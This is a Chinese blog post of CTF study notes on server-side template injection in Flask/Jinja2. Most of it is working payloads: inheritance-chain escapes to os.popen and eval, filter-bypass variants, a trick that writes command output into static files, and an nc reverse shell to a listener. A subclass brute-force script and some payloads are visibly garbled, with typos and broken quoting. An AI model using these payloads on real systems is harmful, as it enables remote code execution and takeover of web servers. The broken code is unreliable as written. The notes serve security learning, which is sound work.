@@ -1,0 +1,156 @@
+<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>SSTI | wOYOm的博客</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><link rel="preload" as="font" crossorigin="anonymous" href="/font/Bender.ttf"><link rel="preload" as="font" crossorigin="anonymous" href="/font/BenderLight.woff2"><link rel="preload" as="font" crossorigin="anonymous" href="/font/JetBrainsMono-Regular.woff2"><link rel="stylesheet" href="/css/arknights.css"><style>@font-face {
+  font-family: Bender;
+  src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
+}
+@font-face {
+  font-family: BenderLight;
+  src: local('BenderLight'), url("/font/BenderLight.ttf");
+}
+@font-face {
+  font-family: 'JetBrains Mono';
+  src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}
+</style><meta name="page-config" content="{&quot;code_fold&quot;:null}"><script class="pjax-js">var config = {"root":"/","code_fold":15,"search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy"}};
+var page_config = {
+  code_fold: null
+};
+function updatePageConfig() {
+  var newPageConfig = document.querySelector('meta[name="page-config"]');
+  if (newPageConfig) {
+    page_config = JSON.parse(newPageConfig.content);
+  }
+}
+document.addEventListener('pjax:complete', function() { updatePageConfig(); });
+updatePageConfig();</script><link type="text/css" rel="stylesheet" href="/lib/encrypt/hbe.style.css"><script src="//unpkg.com/mermaid@10.5.0/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
+ document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark')
+ document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.woff2") format('woff2');
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}</style><style>:root {
+ --dark-background: url('https://image-assets.mihuashi.com/permanent/4636128|-2024/07/15/22/FoQgPgpt91kubhyYFgogmbaUv5ws.jpg');
+ --light-background: url('https://image-assets.mihuashi.com/permanent/4636128|-2024/07/15/22/FoQgPgpt91kubhyYFgogmbaUv5ws.jpg');
+ --theme-encrypt-confirm: 'confirm'
+}</style><script defer src="/js/arknights.js"></script><script defer src="/js/search.js"></script><script defer src="https://vercount.one/js"></script><script defer type="module">import mermaid from '//unpkg.com/mermaid@10.5.0/dist/mermaid.esm.mjs';
+window.mermaid = mermaid;
+code.paintMermaid();
+</script><script async src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script async src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script async src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script async src="/lib/encrypt/hbe.js"></script><script async src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js','data-pjax','.vercount','meta[name=page-config]'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);document.addEventListener('pjax:success', _ => {
+ const script = document.createElement('script');
+ script.src = 'https://vercount.one/js';
+ document.head.appendChild(script);
+});reset()})</script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
+const postBg = document.querySelector('#post-bg');
+if (postBg) lightGallery(postBg, {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js','data-pjax','.vercount','meta[name=page-config]'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);document.addEventListener('pjax:success', _ => {
+ const script = document.createElement('script');
+ script.src = 'https://vercount.one/js';
+ document.head.appendChild(script);
+});reset()})</script><meta name="generator" content="Hexo 7.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup" tabindex="0"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>SSTI</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2026-02-05T03:17:27.000Z" id="date"> 2026-02-05</time></div></span><br><span>Last Update: <div class="control"><time datetime="2026-02-12T12:23:50.206Z" id="updated"> 2026-02-12</time></div></span><br><span id="vercount_container_page_pv">Page View: <span class="control" id="vercount_value_page_pv">loading...</span></span></div></div><hr><div id="post-content"><h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><p>SSTI是一种服务器端模板注入漏洞，发生在应用程序使用模板引擎渲染用户输入时未能正确过滤或转义用户提供的内容。</p>
+<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>服务端没有对用户输入做处理，将其变成了web应用模板内容的一部分。模板引擎在编译渲染的过程中，会执行用户插入的语句。可能导致敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。</p>
+<h4 id="模板引擎（web开发的模板引擎）"><a href="#模板引擎（web开发的模板引擎）" class="headerlink" title="模板引擎（web开发的模板引擎）"></a>模板引擎（web开发的模板引擎）</h4><p>写题最常见的模板是python的模板，从后端程序员的角度这个漏洞源自于程序员偷懒将render_template_string解析字符串代替了render_template的渲染。<strong>做题时可以用wapplayzer插件，查看框架和语言，一般是Flask和Python的话就很有可能是SSTI</strong>当然jinjia2（一种python模板引擎是flask框架下的）也是明显提示。</p>
+<p>常见的stti漏洞一般都存在于跟用户输入有关的地方比如：欢迎用户进入、留言板之类的地方。</p>
+<h2 id="SSTI漏洞的应用"><a href="#SSTI漏洞的应用" class="headerlink" title="SSTI漏洞的应用"></a>SSTI漏洞的应用</h2><p>这里用最常见的python模板举例</p>
+<p>在模板注入前我们要知道大多数框架下的模板引擎是运行访问对象的类，并通过类继承链访问父类或子类。可以理解为一种魔术方法，而这里面就包括可以做到RCE的类。</p>
+<p>被<code>\&#123;\&#123;\&#125;\&#125;</code>包裹的内容在模板渲染会被当做变量解析替换，因此<pre> <code>text \&#123;\&#123;7*7\&#125;\&#125; </code> </pre>会被执行运算生成49，这也是测试漏洞的方法。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">__class__ ：返回类型所属的对象。（返回你所属的张家）<br>__base__  ：返回该对象所继承的父类（返回你爹的名字）<br>__mro__ ：返回该对象的所有父类（返回你家族谱）<br>__subclasses__() ：获取当前类的所有子类（返回你的所有孩子）<br>__init__ ： 类的初始化方法（构造函数）<br>__globals__ ： 对包含(保存)函数全局变量的字典的引用（你家中所有物品）<br></code></pre></td></tr></table></figure>
+
+<p>我们可以用当前类，通过class返回对象，然后用mro或者base返回父类，直到父类为object类（所有的类都是object类的子类），再用sublasses返回所有的子类，这样就能找到存在rce的类。</p>
+<p>当前类可以这样表示：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;</span>.__class__<br> <br>().__class__<br> <br>[].__class__<br> <br><span class="hljs-string">&quot;&quot;</span>.__class__<br> <br>&#123;&#125;.__class__<br></code></pre></td></tr></table></figure>
+
+<p>构造</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123; &#123;<span class="hljs-string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__\&#125;\&#125;<br></code></pre></td></tr></table></figure>
+
+<p>查看所有类</p>
+<p>其中已知的可以进行rce的类是os._wrap_close，我们可以找到它的序号（查询所有类后去找（可以试试AI）或者用脚本）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url =<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入URL链接：)</span><br><span class="hljs-string">for i in range(500):</span><br><span class="hljs-string">data =&#123;&quot;name&quot;:</span><br><span class="hljs-string">&quot;\&#123;\&#123;O)._class_._base_.__subclasses_()[&quot;+str(i)+&quot;]._init_._globals_[&#x27;</span>__builtins_1\&#125;\&#125;<span class="hljs-string">&quot;]</span><br><span class="hljs-string">try:</span><br><span class="hljs-string">response = requests.posf(url,data=data)</span><br><span class="hljs-string">#print(response.text)</span><br><span class="hljs-string">if response.status_code == 200:if &#x27;popen&#x27; in response.text:print(i)</span><br><span class="hljs-string">except:</span><br><span class="hljs-string">pass</span><br></code></pre></td></tr></table></figure>
+
+<p>假设是132那我们就可以这样构造payload，<code>__init__</code>可以初始化类 globals则可以寻找popen然后直接命令执行，最后加一个read()</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">\&#123;\&#123;<span class="hljs-string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="hljs-number">132</span>].__init__.__globals__[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;cat%20/flag&#x27;</span>).read()\&#125;\&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这个时候我们就成功调用了popen，可以直接进行命令执行。</p>
+<h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><p>常见会被过滤的有数字，因为这里面我们调用os._wrap_close是用数字实现的</p>
+<h4 id="1-更改模块"><a href="#1-更改模块" class="headerlink" title="1.更改模块"></a>1.更改模块</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">\&#123;\&#123;a.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].<span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;__import__(&quot;os&quot;).popen(&quot;cat /flag&quot;).read()&#x27;</span>)\&#125;\&#125;<br> <br>采用了builtins模块，比用os_wrap_close更加方便<br></code></pre></td></tr></table></figure>
+
+<h4 id="2-采用全角数字"><a href="#2-采用全角数字" class="headerlink" title="2.采用全角数字"></a>2.采用全角数字</h4><p>（在花括号等被过滤的时候也可以进行绕过）</p>
+<h4 id="3-用request绕过"><a href="#3-用request绕过" class="headerlink" title="3.用request绕过"></a>3.用request绕过</h4><p>request可以获得请求的相关信息，通过这个特性可以做到绕过</p>
+<p>用‘’也可以</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">例如<br>\&#123;\&#123;<span class="hljs-string">&#x27;&#x27;</span>.__class__\&#125;\&#125; 改为\&#123;\&#123;<span class="hljs-string">&#x27;&#x27;</span>[request.args.t1]\&#125;\&#125;&amp;t1=__class__<br> <br>__class__ 改为 _<span class="hljs-string">&#x27;&#x27;</span>_cla<span class="hljs-string">&#x27;&#x27;</span>ss_<span class="hljs-string">&#x27;&#x27;</span>_<br></code></pre></td></tr></table></figure>
+
+
+<p>这里的request不是python的库而是flask的内部函数<br> 这里把request里的所有东西都展示出来<br> request.args.key #获取get传入的key的值<br> request.form.key #获取post传入参数(Content-Type:applicaation&#x2F;x-www-form-urlencoded或multipart&#x2F;form-data)<br> reguest.values.key #获取所有参数，如果get和post有同一个参数，post的参数会覆盖get<br> request.cookies.key #获取cookies传入参数<br> request.headers.key #获取请求头请求参数<br> request.data #获取post传入参数(Content-Type:a&#x2F;b)<br> request.json #获取post传入json参数 (Content-Type: application&#x2F;json)</p>
+<h4 id="4-’’被过滤"><a href="#4-’’被过滤" class="headerlink" title="4.’’被过滤"></a>4.’’被过滤</h4><p>‘’被过滤意味着builtins和import的使用会被限制这里可以使用request.args.x(这里x为get的参数)来绕过</p>
+<p>payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">\&#123;\&#123;a.__init__.__globals__[request.args.x].<span class="hljs-built_in">eval</span>(request.args.y)\&#125;\&#125;&amp;x=__builtins__&amp;y=<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&quot;os&quot;</span>).popen(<span class="hljs-string">&quot;cat /flag&quot;</span>).read()<br><br></code></pre></td></tr></table></figure>
+
+<p>同时如果args被ban了可以把<code>request.args.x</code>替换成<code>request[&#39;value&#39;][&#39;x&#39;]</code></p>
+<p>request.cookies.x也可以作为代替，传参要传在cookies中</p>
+<p>cookies里头的参数要加;</p>
+<h4 id="5-解决request被ban问题"><a href="#5-解决request被ban问题" class="headerlink" title="5.解决request被ban问题"></a>5.解决request被ban问题</h4><p>chr()拼接，但是chr()无法直接被使用，要通过走继承链的方式提取chr()函数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">一些<span class="hljs-built_in">chr</span>()的构造方式<br><span class="hljs-string">&quot;&quot;</span>.__class__.__base__.__subclasses__()[x].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].<span class="hljs-built_in">chr</span><br>get_flashed_messages.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].<span class="hljs-built_in">chr</span><br>url_for.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].<span class="hljs-built_in">chr</span><br>lipsum.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].<span class="hljs-built_in">chr</span><br>x.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].<span class="hljs-built_in">chr</span>  (x为任意值)<br></code></pre></td></tr></table></figure>
+
+<p>然后这时候用字符串（变量）chr接收这个chr函数我们就可以使用chr()来进行拼接绕过了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"> \&#123;% <span class="hljs-built_in">set</span> <span class="hljs-built_in">chr</span>= <span class="hljs-string">&#x27;&#x27;</span>[<span class="hljs-string">&#x27;__class__&#x27;</span>][<span class="hljs-string">&#x27;__base__&#x27;</span>][<span class="hljs-string">&#x27;__subclasses__&#x27;</span>]()[<span class="hljs-number">137</span>][<span class="hljs-string">&#x27;__init__&#x27;</span>][<span class="hljs-string">&#x27;__globals__&#x27;</span>][<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;chr&#x27;</span>]%\&#125;（这一步是接收）<br>\&#123;% <span class="hljs-built_in">set</span> cmd=<span class="hljs-string">&#x27;cat &#x27;</span>~<span class="hljs-built_in">chr</span>(<span class="hljs-number">47</span>)~<span class="hljs-string">&#x27;flag&#x27;</span> %\&#125;（绕过 /）<br>\&#123;%<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>[<span class="hljs-string">&#x27;__class__&#x27;</span>][<span class="hljs-string">&#x27;__base__&#x27;</span>][<span class="hljs-string">&#x27;__subclasses__&#x27;</span>]()[<span class="hljs-number">137</span>][<span class="hljs-string">&#x27;__init__&#x27;</span>][<span class="hljs-string">&#x27;__globals__&#x27;</span>][<span class="hljs-string">&#x27;popen&#x27;</span>](cmd)[<span class="hljs-string">&#x27;read&#x27;</span>]())%\&#125;（读取）<br></code></pre></td></tr></table></figure>
+
+<p>~是jinjia2独有的字符串连接符</p>
+<h4 id="6-绕过"><a href="#6-绕过" class="headerlink" title="6 .     . 绕过"></a>6 .     . 绕过</h4><p>可以用atter()绕过，也可以用[ ]绕过（就是只是把.后面内容放进中括号再用‘ ’包起来就行）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">|attr(<span class="hljs-string">&quot;__class__&quot;</span>)就相当于.__class__<br></code></pre></td></tr></table></figure>
+
+<p>示例</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">\&#123;\&#123;lipsum|attr(<span class="hljs-string">&quot;__globals__&quot;</span>)|attr(<span class="hljs-string">&quot;get&quot;</span>)(<span class="hljs-string">&quot;os&quot;</span>)|attr(<span class="hljs-string">&quot;popen&quot;</span>)(<span class="hljs-string">&quot;whoami&quot;</span>)|attr(<span class="hljs-string">&quot;read&quot;</span>)()\&#125;\&#125;<br><br>这里这个pyload是改自<br>\&#123;\&#123;lipsum._globals_.get(<span class="hljs-string">&quot;os&quot;</span>).popen(<span class="hljs-string">&#x27;whoami&#x27;</span>).read()\&#125;\&#125;<br><br>这里值得注意的是（不用get）<br>\&#123;\&#123;lipsum._globals_.os.popen(<span class="hljs-string">&#x27;whoami&#x27;</span>).read()\&#125;\&#125;是成立的<br><br>但是，<br>\&#123;\&#123;lipsum|attr(<span class="hljs-string">&quot;__globals__&quot;</span>)|attr(<span class="hljs-string">&quot;get&quot;</span>)(<span class="hljs-string">&quot;os&quot;</span>)|attr(<span class="hljs-string">&quot;popen&quot;</span>)(<span class="hljs-string">&quot;whoami&quot;</span>)|attr(<span class="hljs-string">&quot;read&quot;</span>)()\&#125;\&#125;<br>如果不加get，就会失败<br><br></code></pre></td></tr></table></figure>
+
+<h4 id="7-绕过"><a href="#7-绕过" class="headerlink" title="7.\{\{\}\}绕过"></a>7.<code>\&#123;\&#123;\&#125;\&#125;</code>绕过</h4><p>用<code>\&#123;%%\&#125;</code>但是要加print</p>
+<h4 id="8-下划线绕过"><a href="#8-下划线绕过" class="headerlink" title="8._下划线绕过"></a>8._下划线绕过</h4><p>以编码绕过 python解析器支持 hex ，unicode编码，全角字符也可以</p>
+<h4 id="9-关键字过滤"><a href="#9-关键字过滤" class="headerlink" title="9.关键字过滤"></a>9.关键字过滤</h4><p>这里举例子比如<code>\&#123;\&#123;lipsum.__globals__.os.popen(&#39;ls&#39;).read()\&#125;\&#125;</code></p>
+<p>改成<code>\&#123;\&#123;lipsum[&#39;__glob&#39;&#39;als__&#39;][&#39;os&#39;][&#39;po&#39;&#39;pen&#39;](&#39;ls&#39;).read()\&#125;\&#125;</code></p>
+<h4 id="10-无回显SSTI"><a href="#10-无回显SSTI" class="headerlink" title="10.无回显SSTI"></a>10.无回显SSTI</h4><p>只会显示对或者不对</p>
+<p>写静态文件</p>
+<p>在 Flask 中，<strong>静态目录（Static Directory）</strong> 是用于存储静态文件（如 CSS、JavaScript、图片等）的特殊目录，这些文件不需要服务器端处理，可以直接发送给客户端。</p>
+<p>相关目录演示</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs txt">project/<br>├── app.py<br>├── static/<br>│   ├── css/style.css<br>│   ├── js/script.js<br>│   └── images/logo.png<br>└── templates/<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">\&#123;\&#123;lipsum.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;echo &quot;hhh&quot; &gt;/app/static/1.txt&#x27;</span>).read()\&#125;\&#125;<br></code></pre></td></tr></table></figure>
+
+<p>1.txt写入静态文件</p>
+<p>这时候就可以通过静态文件执行命令了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">\&#123;\&#123;lipsum.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27; ls &gt;/app/static/1.txt&#x27;</span>).read()\&#125;\&#125;<br></code></pre></td></tr></table></figure>
+
+<h5 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h5><p>用云服务器监听端口</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">\&#123;\&#123;lipsum.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;nc 127.0.0.1 2333 -e /bin/bash&#x27;</span>).read()\&#125;\&#125;<br></code></pre></td></tr></table></figure>
+
+<p>可以在云服务器上进行交互ls等命令执行</p>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2026/02/09/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">← Next 信息收集</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2025/12/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传 Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a><a onclick="BgmControl()"><svg id="bgm-control" viewBox="0 0 30 34" fill="#18d1ff" style="width: 24px; transition: transform .3s;margin-top: 4px"><path d="M25.998 23.422V11.29h3.999v12.132h-3.999zM19.497 6.234h4.001v22.243h-4.001V6.234zM12.998.867h4v32.978h-4V.867zm-6.5 5.367h4.001v22.243H6.498V6.234zm-6.5 5.056h4v12.132h-4V11.29z"></path></svg><audio id="bgm" src="/audio/bgm1.mp3" autoplay loop crossorigin="anonymous"> </audio></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://media.prts.wiki/c/cc/%E5%A4%B4%E5%83%8F_%E8%89%BE%E9%9B%85%E6%B3%95%E6%8B%89.png" alt="Logo" style="margin:0;border-radius:0;"></a><h1 id="Dr"><a href="/">wOyOm</a></h1><div id="description"><p>记录web学习</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SSTI"><span class="toc-number">1.</span> <span class="toc-text">SSTI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞成因</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%EF%BC%88web%E5%BC%80%E5%8F%91%E7%9A%84%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%EF%BC%89"><span class="toc-number">1.1.1.</span> <span class="toc-text">模板引擎（web开发的模板引擎）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSTI%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%BA%94%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">SSTI漏洞的应用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-number">3.</span> <span class="toc-text">绕过方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%9B%B4%E6%94%B9%E6%A8%A1%E5%9D%97"><span class="toc-number">3.0.1.</span> <span class="toc-text">1.更改模块</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E9%87%87%E7%94%A8%E5%85%A8%E8%A7%92%E6%95%B0%E5%AD%97"><span class="toc-number">3.0.2.</span> <span class="toc-text">2.采用全角数字</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E7%94%A8request%E7%BB%95%E8%BF%87"><span class="toc-number">3.0.3.</span> <span class="toc-text">3.用request绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E2%80%99%E2%80%99%E8%A2%AB%E8%BF%87%E6%BB%A4"><span class="toc-number">3.0.4.</span> <span class="toc-text">4.’’被过滤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E8%A7%A3%E5%86%B3request%E8%A2%ABban%E9%97%AE%E9%A2%98"><span class="toc-number">3.0.5.</span> <span class="toc-text">5.解决request被ban问题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-%E7%BB%95%E8%BF%87"><span class="toc-number">3.0.6.</span> <span class="toc-text">6 .     . 绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-%E7%BB%95%E8%BF%87"><span class="toc-number">3.0.7.</span> <span class="toc-text">7.\{\{\}\}绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-%E4%B8%8B%E5%88%92%E7%BA%BF%E7%BB%95%E8%BF%87"><span class="toc-number">3.0.8.</span> <span class="toc-text">8._下划线绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4"><span class="toc-number">3.0.9.</span> <span class="toc-text">9.关键字过滤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#10-%E6%97%A0%E5%9B%9E%E6%98%BESSTI"><span class="toc-number">3.0.10.</span> <span class="toc-text">10.无回显SSTI</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">3.0.10.1.</span> <span class="toc-text">反弹shell</span></a></li></ol></li></ol></li></ol></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas></body></html>
